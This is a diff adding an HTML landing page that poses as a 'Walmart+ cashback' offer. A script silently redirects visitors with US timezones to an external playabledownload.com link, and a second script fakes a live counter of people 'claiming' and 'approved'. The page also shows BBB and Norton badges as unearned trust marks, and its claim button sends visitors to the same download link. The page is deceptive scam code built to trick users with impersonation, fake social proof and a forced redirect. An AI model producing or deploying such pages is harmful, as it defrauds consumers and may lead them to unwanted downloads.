@@ -1,0 +1,43 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <!-- PASTE GOOGLE CODE HERE -->  
+    <meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXX">  
+
+    <!-- AUTO-REDIRECT US USERS -->  
+    <script>  
+    const isAmerican = () => {  
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;  
+        const isUSISP = /Comcast|Verizon|AT&T|Spectrum/i.test(navigator.userAgent);  
+        return timezone.startsWith('America/') || isUSISP;  
+    };  
+    if(isAmerican()) window.location.href = 'https://playabledownload.com/1808970?us='+Date.now();  
+    </script>  
+
+    <!-- FAKE LIVE COUNTER -->  
+    <script>  
+    setInterval(() => {  
+        document.title = `🔥 ${Math.floor(800+Math.random()*1200)} CLAIMING NOW!`;  
+        document.getElementById('counter').innerText =  
+        `🚨 ${Math.floor(2000+Math.random()*1000)} Approved Today`;  
+    }, 2000);  
+    </script>  
+</head>  
+
+<body style="background:#000;color:#fff;text-align:center;font-family:Arial">  
+    <div style="max-width:800px;margin:0 auto">  
+        <h1 style="color:#0066cc">🇺🇸 EXCLUSIVE WALMART+ CASHBACK</h1>  
+        <img src="https://i.imgur.com/kA9w7Zy.png" alt="BBB" style="height:50px">  
+        <img src="https://i.imgur.com/XYZTIMEr.png" alt="Norton" style="height:50px">  
+
+        <button onclick="window.location.href='https://playabledownload.com/1808970'"  
+                style="background:#0066cc;color:white;padding:25px;border-radius:15px;font-size:24px;margin:20px">  
+            🔥 CLAIM 20% CASHBACK  
+        </button>  
+
+        <div style="border:2px solid #0066cc;padding:20px;margin:20px">  
+            <div id="counter">🚨 2,892 Americans Approved</div>  
+        </div>  
+    </div>  
+</body>  
+</html>  
